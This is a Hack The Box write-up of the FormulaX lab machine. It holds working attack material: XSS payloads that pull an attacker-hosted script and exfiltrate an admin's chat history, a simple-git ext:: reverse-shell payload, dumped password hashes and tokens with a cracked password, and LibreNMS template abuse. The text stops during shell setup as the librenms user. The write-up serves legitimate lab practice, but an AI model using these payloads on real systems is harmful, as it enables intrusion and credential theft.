---
layout: writeup
category: HTB
description: FormulaX starts with a website used to chat with a bot. Here, there is a contact section where I can contact to admin and inject XSS. I will use this XSS to retrieve the admin's chat history to my host as its the most interesting functionality and I can't retrieve the cookie because it has HttpOnly flag enabled. This story chat reveals a new subdomain, dev.git.auto.update.chatbot.htb, which uses simple-git v3.14 vulnerable to [CVE-2022-24066](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221). Exploiting this gives a shell for www-data, where I can access the mongo database used for the web, crack frank_dorky's hash and see user.txt. Then, it's possible to see port 3000 open internally in localhost, which I will forward and see it's using librenms. The source its located at /opt/librenms and have 771 permissions which gives execute permissions on others. I can execute adduser.php and add a new user. In the web panel, I can create a new [Blade Template](https://laravel.com/docs/11.x/blade#raw-php) as shown in the [documentation](https://docs.librenms.org/Alerting/Templates/) and execute php code that gives me a reverse shell as librenms. As this user, I have read access in the source directory, so I can read .env and have credentials for kai_relay. With kai_relay, I have the sudo privilege to execute as root a script that starts a Libreoffice Apache UNO API instance. This is vulnerable to RCE as seen in [this article](https://hackdefense.com/publications/finding-rce-capabilities-in-the-apache-uno-api/), so I can execute a command that gives me a reverse shell as root.
points: 40
solves: 1966
tags: xss websocket simple-git-cve CVE-2022-24066 mongodb hash-cracking librenms librenms-abuse-template laravel-blade php env-creds sudoers libreoffice-server-abuse apache-uno-api
date: 2024-08-17
title: HTB FormulaX writeup
comments: false
---

FormulaX starts with a website used to chat with a bot. Here, there is a contact section where I can contact to admin and inject XSS. I will use this XSS to retrieve the admin's chat history to my host as its the most interesting functionality and I can't retrieve the cookie because it has HttpOnly flag enabled. This story chat reveals a new subdomain, dev.git.auto.update.chatbot.htb, which uses simple-git v3.14 vulnerable to [CVE-2022-24066](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221). Exploiting this gives a shell for www-data, where I can access the mongo database used for the web, crack frank_dorky's hash and see user.txt. Then, it's possible to see port 3000 open internally in localhost, which I will forward and see it's using librenms. The source its located at /opt/librenms and have 771 permissions which gives execute permissions on others. I can execute adduser.php and add a new user. In the web panel, I can create a new [Blade Template](https://laravel.com/docs/11.x/blade#raw-php) as shown in the [documentation](https://docs.librenms.org/Alerting/Templates/) and execute php code that gives me a reverse shell as librenms. As this user, I have read access in the source directory, so I can read .env and have credentials for kai_relay. With kai_relay, I have the sudo privilege to execute as root a script that starts a Libreoffice Apache UNO API instance. This is vulnerable to RCE as seen in [this article](https://hackdefense.com/publications/finding-rce-capabilities-in-the-apache-uno-api/), so I can execute a command that gives me a reverse shell as root.

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```python
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.6

# Nmap 7.94SVN scan initiated Thu Aug  1 18:10:36 2024 as: nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn -oN formulax 10.10.11.6
Nmap scan report for 10.10.11.6
Host is up (0.045s latency).
Not shown: 62795 closed tcp ports (reset), 2738 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-cors: GET POST
|_http-favicon: Unknown favicon MD5: 496A37014B10519386B2904D1B3086BE
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug  1 18:10:59 2024 -- 1 IP address (1 host up) scanned in 22.41 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

The only interesting port is 80 so let's jump into it.

## Web enumeration

Looking at the headers, I can see it's powered by express and it redirects to /static/index.html:

```bash
❯ curl -s -i http://10.10.11.6
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 01 Aug 2024 18:02:08 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 40
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Location: /static/index.html
Vary: Accept

Found. Redirecting to /static/index.html
```

Following it, seems like a login page, which action is javascript:handleRequest():

```html
❯ curl -s -i -L http://10.10.11.6
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 01 Aug 2024 18:02:51 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 40
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Location: /static/index.html
Vary: Accept

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 01 Aug 2024 18:02:51 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1023
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 28 Jul 2023 02:55:20 GMT
ETag: W/"3ff-1899a6c0dc0"

<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="./index.css">
</head>

<body>
  <center>
    <h2>Your 24/7 Problem-Solving Chatbot &#129302;</h2>
    <div class="login-page">
      <div class="form">
        <form class="login-form" action="javascript:handleRequest()" method="post" class="full">
          <input type="email"  placeholder="Enter Email" name="uname" id="email" required />
          <input type="password" name="psw" id="password" required placeholder="password" />
          <button type="submit">Login</button>
          <div style="margin-top: 4px;">
            <label style ="color: red;" id="error"> </label>
          </div>
          <p class="message">Not registered? <a href="/static/register.html">Create an account</a></p>
        </form>
      </div>
    </div>
    <script src="/scripts/axios.min.js"></script>
    <script src="./index.js"></script>
  </center>
</body>

</html>
```

The page looks like this:

![main page](/assets/images/FormulaX/main-page.png)

Intercepting it in burpsuite with firefox, it's sended in json format. As it's probably running a MongoDB, I tried NoSQL injection but it doesn't work:

![nosql injection test](/assets/images/FormulaX/nosql-injection-test.png)

Registering an account and logging in, I can see bunch of functionalities. These are "chat", "change password" and "contact us":

![Logged in as registered user](/assets/images/FormulaX/logged-in-as-registered-user.png)

Fuzzing doesn't return nothing that I didn't saw before:

```plaintext
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://10.10.11.6/restricted/FUZZ.html -mc all -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.6/restricted/FUZZ.html
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

home                    [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 51ms]
about                   [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 109ms]
contact_us              [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 50ms]
chat                    [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 48ms]
Home                    [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 46ms]
Chat                    [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 51ms]
About                   [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 41ms]
changepassword          [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 45ms]
ChangePassword          [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 44ms]
Contact_Us              [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 43ms]
HOME                    [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 45ms]
ABOUT                   [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 45ms]
changePassword          [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 43ms]
Contact_us              [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 42ms]
CHAT                    [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 72ms]
CONTACT_US              [Status: 200, Size: 46, Words: 3, Lines: 1, Duration: 45ms]
:: Progress: [119600/119600] :: Job [1/1] :: 781 req/sec :: Duration: [0:03:03] :: Errors: 0 ::
```

They all return the same length and words because I'm not logged in:

```bash
❯ curl -s -X GET http://10.10.11.6/restricted/changepassword.html
{"Status":"Failed","Message":"No token found"}
❯ curl -s -X GET http://10.10.11.6/restricted/contact_us.html
{"Status":"Failed","Message":"No token found"}
```

I will start looking at chat. It consists on a bot that only has available commands "help" and "history":

![ChatBot](/assets/images/FormulaX/chatbot.png)

Command "help" gives a help for available commands and "history" retrieves all sent messages to the bot. This form's action is a javascript function:

![javascript function in form](/assets/images/FormulaX/javascript-function-in-form.png)

This function is stored in chat.js, which is loaded in the source code of the page and contains all functions of the chat:

![chat.js in src](/assets/images/FormulaX/chat.js-in-src-html-code.png)

![chat.js](/assets/images/FormulaX/chat.js.png)

Function `socket.emit('client_message', '<message to send>)` is used to send a message to the bot. And the socket.on function is used to handle when a message is received from the bot:

```javascript
socket.on('message', (my_message) => {

  <DO SOMETHING WITH THE MESSAGE RECEIVED>

})
```

To use this, it's importing some things at the start of the code:

```javascript
const res = axios.get(`/user/api/chat`);
const socket = io('/',{withCredentials: true});
```

Nothing more interesting here. Looking at the "change password" functionality, it seems to work:

![change password](/assets/images/FormulaX/change-password.png)

It successfully changed my password:

![new password works](/assets/images/FormulaX/new-password-works.png)

However, the old password is needed here, so its nothing interesting:

![old password needed](/assets/images/FormulaX/old-password-needed.png)

The only functionality left is "contact us", which allows contact to admin:

![contact us](/assets/images/FormulaX/contac_us.png)

It seems to work as it sends a POST request to `/user/api/contact_us`:

![contact us request](/assets/images/FormulaX/contact-us-request.png)

A nice vulnerability to test here its XSS. For that I will start a python http request to receive a request to my IP by sending the payload `<img src=x onerror=\"fetch('http://10.10.15.95/<name of the field>')\">`. I will do `<name of the field>` to see in which field its vulnerable in case it is:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![sended XSS in contact us](/assets/images/FormulaX/sended-xss-contact_us.png)

I receive a lot of request from all the fields, so they are vulnerable and somebody reviews my messages:

![received first payload xss](/assets/images/FormulaX/received-xss-first-payload.png)

As I have confirmed an XSS vulnerability, I will use the payload `<img src=x onerror="d=document; _ = d.createElement('script');_.src='http://10.10.15.95/script.js';d.body.appendChild(_)">` to create a script tag in the admin's panel that loads a `script.js` file located in my server:

![sended xss payload that interprets my script.js](/assets/images/FormulaX/sended-xss-payload-interprets-my-script.js.png)

And I successfully receive a connection requesting my script.js:

![request to script.js](/assets/images/FormulaX/request-to-script.js.png)

I will create my script.js to see the admin's history with the chatbot like this:

```javascript
const res = axios.get(`/user/api/chat`);
const socket = io('/',{withCredentials: true});
socket.emit('client_message', 'history');
socket.on('message', (my_message) => {
  fetch('http://10.10.15.95:8000/?msg=' + btoa(my_message));
});
```

First, this imports the socket as saw in the script. Then, it sends the 'history' command to the chatbot as saw in the chat.js above (`socket.emit('client_message', 'history')`) and when a message is received from the bot (`socket.on('message', (my_message))`), it makes a request to my http server with the base64-encoded message (`fetch('http://10.10.15.95:8000/?msg=' + btoa(my_message))`). 

I will also change my payload sended to the admin to import /socket/socket.io.js because that's where the io function is defined. My resulting payload will be `<img src=x onerror=\"socketElement = document.createElement('script'); socketElement.src='/socket.io/socket.io.js'; document.head.appendChild(socketElement); socketElement.addEventListener('load', function(){ myScript = document.createElement('script'); myScript.src='http://10.10.15.95/script.js';document.body.appendChild(myScript)})\">`. 

Also, I have created this script to be more easy to receive the messages and decrypt and print them directly when they are sended:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import urllib

class myHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)
        b64_message = query_params.get('msg', [''])[0]
        message = base64.b64decode(b64_message)
        print(f"Received message: {message.decode()}")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Request received")
    def log_message(self, format, *args):
        return

def start_server(port):
    server_address = ('', port)
    httpd = HTTPServer(server_address, myHandler)
    print(f"Starting server on port {port}")
    httpd.serve_forever()


start_server(8000)
```

I will execute the script and also start a python server in port 80 for the server to interpret my script.js:

```bash
❯ python3 receive-admin-messages.py
Starting server on port 8000
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now I will send the payload:

![final payload sended](/assets/images/FormulaX/final-payload-sended.png)

And I receive the messages:

![admin's messages received](/assets/images/FormulaX/admin's-messages-received.png)

The most interesting message is this, where it asks the bot to write a script for dev-git-auto-update.chatbot.htb:

```bash
Write a script for  dev-git-auto-update.chatbot.htb to work properly
```

I will append this line to /etc/hosts for the machine to know where it should point that subdomain:

```bash
10.10.11.6 dev-git-auto-update.chatbot.htb chatbot.htb
```

# Access as www-data

In dev-git-auto-update.chatbot.htb, I can see it's using simple-git v3.14 to clone repositories:

![simple-git used in subdomain](/assets/images/FormulaX/simple-git-used-in-subdomain.png)

Looking for vulnerabilities, I saw [this interesting one](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221) about RCE using the ext protocol. I will reproduce it and send myself a ping with the payload `ext::bash -c ping% -c% 1% 10.10.15.95 >&2`:

```plaintext
❯ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

![sended exploit ping simple-git](/assets/images/FormulaX/sended-exploit-simple-git-ping.png)

And I receive the ping!:

![ping received](/assets/images/FormulaX/ping-received.png)

Now, instead of a ping, I will start nc in port 443 and execute a bash reverse shell with the following payload:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

```plaintext
ext::bash -c bash% -i% >&% /dev/tcp/10.10.15.95/443% 0>&1% >&2
```

![sended revshell payload](/assets/images/FormulaX/sended-revshell-payload.png)

And I receive a shell as www-data:

![www-data shell received](/assets/images/FormulaX/www-data-shell-received.png)

Now I will do the tty treatment to have a completely interactive shell:

```plaintext
www-data@formulax:~/git-auto-update$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@formulax:~/git-auto-update$ ^Z
[1]  + 143019 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 143019 continued  nc -lvnp 443
                                     reset xterm
www-data@formulax:~/git-auto-update$ export TERM=xterm
www-data@formulax:~/git-auto-update$ export SHELL=bash
www-data@formulax:~/git-auto-update$ stty rows 50 cols 184
```

* `script /dev/null -c bash`: Spawns a tty.
* `ctrl+z`: puts the shell in background for later doing a treatment.
* `stty raw -echo;fg`: gives the shell back again.
* `reset xterm`: resets the terminal to give the bash console.
* `export TERM=xterm`: let do ctrl+l to clean the terminal.
* `export SHELL=bash`: specifies the system that it's using a bash console.
* `stty rows <YOUR ROWS> cols <YOUR COLUMNS>`: sets the size of the current full terminal window. It is possible to view the right size for your window running `stty size` in a entire new window on your terminal.

# Access as frank_dorky

Looking at the open ports, I can see [port 27017](https://www.mongodb.com/docs/manual/reference/default-mongodb-port/), which corresponds to mongodb. I will connect and see the info there, as it's probably the database for the web:

```bash
www-data@formulax:~/git-auto-update$ mongo
MongoDB shell version v4.4.29
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("b3c9f88a-0a55-4a7b-8c8f-cb9ee54892f1") }
MongoDB server version: 4.4.8
---
The server generated these startup warnings when booting: 
        2024-08-02T06:11:42.385+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2024-08-02T06:11:43.273+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
> show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB
> use testing
switched to db testing
> show collections
messages
users
```

There, I saw a users table, I will dump all info there:

```bash
> db.users.find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjI3MDA3MTJ9.VraBv7lpH4ZO1F9Hj-bcMc18N9HnzDEC7UJmGn6pAJs", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
{ "_id" : ObjectId("66ae473c4fc5faaa87a56175"), "name" : "gabri", "email" : "gabri@gabri.com", "password" : "$2b$10$6.hw.gx4qgWF7LacaO9OLO4K2OkvVQ4R2Z9Oc6AVzmP4zVTeK.39i", "terms" : true, "value" : false, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NmFlNDczYzRmYzVmYWFhODdhNTYxNzUiLCJpYXQiOjE3MjI2OTc1Mzl9.6DqDjpy73Ls7ns1rQcuI8pDeU_3Lp_ZI-cLhVbJLY1I", "__v" : 0 }
```

There are two relevant hashes, one for admin and another for frank_dorky (the one for gabri is mine). Looking at the /etc/passwd, there is a frank_dorky user and two more, kai_relay and librenms:

```bash
www-data@formulax:~/git-auto-update$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
librenms:x:999:999::/opt/librenms:/usr/bin/bash
kai_relay:x:1001:1001:Kai Relay,,,:/home/kai_relay:/bin/bash
frank_dorky:x:1002:1002:,,,:/home/frank_dorky:/bin/bash
```

As frank_dorky is a valid user in the system, I will try his hash first:

```bash
❯ hashcat -m 3200 frank_dorky.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<..SNIP..>

$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6:manchesterunited
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s...psB4J6
Time.Started.....: Sat Aug  3 18:10:35 2024 (37 secs)
Time.Estimated...: Sat Aug  3 18:11:12 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       75 H/s (6.62ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2800/14344385 (0.02%)
Rejected.........: 0/2800 (0.00%)
Restore.Point....: 2784/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: meagan -> j123456
Hardware.Mon.#1..: Util: 90%

Started: Sat Aug  3 18:10:31 2024
Stopped: Sat Aug  3 18:11:14 2024
```

I have his password! Now I can pivot to that user and see user.txt:

```bash
www-data@formulax:~/git-auto-update$ su frank_dorky
Password: manchesterunited
frank_dorky@formulax:/var/www/git-auto-update$ cd ~
frank_dorky@formulax:~$ cat user.txt 
a7****************************52
```

# Access as librenms

Looking again at the ports opened internally, I can see some ports open:

```bash
frank_dorky@formulax:~$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8082          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43101         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -  
```

> Note: I could go directly for this but I wouldn't be able to see user.txt until I'm root so that's why I do it now.

**Port 8082 is for the main web page that I could access with the IP**:

```bash
frank_dorky@formulax:~$ curl -i localhost:8082
HTTP/1.1 302 Found
X-Powered-By: Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Location: /static/index.html
Vary: Accept
Content-Type: text/plain; charset=utf-8
Content-Length: 40
Date: Sat, 03 Aug 2024 16:31:10 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Found. Redirecting to /static/index.html
```

**Port 8081 is for the git report generator I exploited before**:
```bash
frank_dorky@formulax:~$ curl -i localhost:8081
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 28 Jul 2023 12:39:49 GMT
ETag: W/"406-1899c832afa"
Content-Type: text/html; charset=UTF-8
Content-Length: 1030
Date: Sat, 03 Aug 2024 16:32:23 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="./index.css">
  <title>Git Updator</title>
</head>
<body>

  <center>
    <h2> Under Development - Git Auto Report Generator </h2>
    <div class="login-page">
      <div class="form">
        <form class="login-form" action="javascript:handleRequest()" method="post" class="full">
          <input type="text"  placeholder="Enter Remote Git Url" name="giturl" id="giturl" required />
          <button type="submit">Get Report</button>
          <div style="margin-top: 4px;">
            <label style ="color: red;" id="error"> </label>
          </div>
        </form>
      </div>
    </div>

    <div class="container_bottom">
      <div class="content_bottom">
        <!-- Content inside the div -->
        Made with &#10084; by Chatbot🤖 Using simple-git v3.14
      </div>
    </div>
  </center>
  <script src="./index.js"></script>
</body>

</html>
```

**And port 8000 is probably for the admin, who triggers my XSS I exploited before**:

```bash
frank_dorky@formulax:~$ curl -i localhost:8000
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 08 Sep 2023 12:13:02 GMT
ETag: W/"3f3-18a74b5bea8"
Content-Type: text/html; charset=UTF-8
Content-Length: 1011
Date: Sat, 03 Aug 2024 16:34:20 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="./index.css">
</head>

<body>
  <center>
    <div class="overlay">
      <h2 style="color:white">Remotely Manage Office Work</h2>

    <div class="login-page">
      <div class="form">
        <form class="login-form" action="javascript:handleRequest()" method="post" class="full">
          <input type="text"  placeholder="Enter username" name="uname" id="email" required />
          <input type="password" name="psw" id="password" required placeholder="password" />
          <button type="submit">Login</button>
          <div style="margin-top: 4px;">
            <label style ="color: red;" id="error"> </label>
          </div>
          <p class="message">Registration is not allowed at the moment</a></p>
        </form>
      </div>
    </div>
  </div>
  <script src="/axios/axios.min.js"></script>
  <script src="./index.js"></script>

  </center>
</body>

</html>
```

So I'm left with port 3000, which is a LibreNMS instance:

```bash
frank_dorky@formulax:~$ curl -i -L localhost:3000
<..SNIP..>

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Cache-Control: no-cache, private
Date: Sat, 03 Aug 2024 16:36:15 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6Im81WVFueE1pWW1OUzRFWlFIVUs3a1E9PSIsInZhbHVlIjoiVWtJejluWDRaLzA1TkxBdi9MSVdUN0JzaWNMQnBVcm9TT1VlTjJ2dHdKT0gvbmpBRjF3cDVQM0R1TXlDTnRMUVE4bWpYeUk5UmtOZWRzcFQ4SFk4bXNXdVJmNUgwTnVIZ2VqbFVLZW9uWGhhbVBUdHN3NmZnRzl4R1E4bUFsY20iLCJtYWMiOiI5Yzg2OWEyYzM3MmU2MGU3MDk3MTNlYjJjNjc5NTUxNGI3NTU0ZWE3MDExZmQ0NWY0ZDcxZTA1YzUyZDZhY2I3IiwidGFnIjoiIn0%3D; expires=Tue, 27-Aug-2024 16:36:15 GMT; Max-Age=2073600; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IkhSUHljMWRQeHdlTFhNMGpWU2poTnc9PSIsInZhbHVlIjoiTU51NDZRYWh3S2xPa2R1MzRmL1B1c2QvTzlySVZvWk40anlxS0VRMTUvTGM1UzkxNHFOWkZEM2ZNUVMxd2tmNVFxd2wyZmoyUzRWTWFHZ0pzR2JJVVR0d21BQlQ3OW9MZXNFRkoxb0p6emt3SXlJaFdnaVZ5N1lneGVXVHluOXgiLCJtYWMiOiJhNjg1NDU4MjQyMzQ0OWRhNmU1MWY5MzlkYjNjNGQ5YTEwMWFjMzA0OGNiZjMxYTIwNmQxYjQzYzM3N2NiMGQ1IiwidGFnIjoiIn0%3D; expires=Tue, 27-Aug-2024 16:36:15 GMT; Max-Age=2073600; path=/; httponly; samesite=lax

<!DOCTYPE HTML>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>LibreNMS</title>
<..SNIP..>
```

LibreNMS is a fully featured network monitoring system that provides a wealth of features and device support:

![what is librenms](/assets/images/FormulaX/what-is-librenms.png)

This seems interesting, so I will forward this port to my machine with ssh:

```bash
❯ ssh frank_dorky@10.10.11.6 -L 3000:127.0.0.1:3000
frank_dorky@10.10.11.6's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Aug  3 16:39:36 2024 from 10.10.15.95
frank_dorky@formulax:~$ 
```

Now I can access it from the browser:

![librenms is accessible in localhost](/assets/images/FormulaX/librenms-is-accessible-localhost.png)

Looking for default credentials, there aren't any:

![librenms no default credentials](/assets/images/FormulaX/librenms-no-default-credentials.png)

The librenms installation is in /opt:

```bash
frank_dorky@formulax:~$ ls /opt/
librenms
```

Searching for add user in librenms, I saw [this question](https://community.librenms.org/t/adding-admin-users-on-librenms/20782) which talks about using an adduser.php script. I will try that and it seems to work:

```bash
frank_dorky@formulax:~$ /opt/librenms/adduser.php
Add User Tool
Usage: ./adduser.php <username> <password> <level 1-10> [email]
frank_dorky@formulax:~$ /opt/librenms/adduser.php gabri 'gabri123' 10
User gabri added successfully
```

The 10 is for giving admin to this user. Now I can access the web panel with the configured credentials:

![access to panel](/assets/images/FormulaX/access-to-panel.png)

Clicking in the librenms icon redirects me to librenms.com so I will add this line to the /etc/hosts:

```bash
127.0.0.1 librenms.com
```

Now it works:

![librenms.com now works](/assets/images/FormulaX/librenms.com-accessible.png)

Looking at the librenms documentation, I saw [this page](https://docs.librenms.org/Alerting/Templates/) which caught my attention because it uses laravel blade templates:

![templates librenms docs](/assets/images/FormulaX/templates-librenms-docs.png)

I will follow that link and see a interesting functionality to execute raw php:

![raw php laravel blade](/assets/images/FormulaX/raw-php-laravel-blade.png)

So I will start a nc listener and create one template that executes a bash reverse shell:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

![template created](/assets/images/FormulaX/template-created.png)

Just clicking on create template gives me a shell as librenms user:

![librenms reverse shell](/assets/images/FormulaX/librenms-revshell.png)

Now I will do the tty treatment to have a more stable and functional shell:

```bash
librenms@formulax:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
librenms@formulax:~$ ^Z
[1]  + 208304 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 208304 continued  nc -lvnp 443
                                     reset xterm
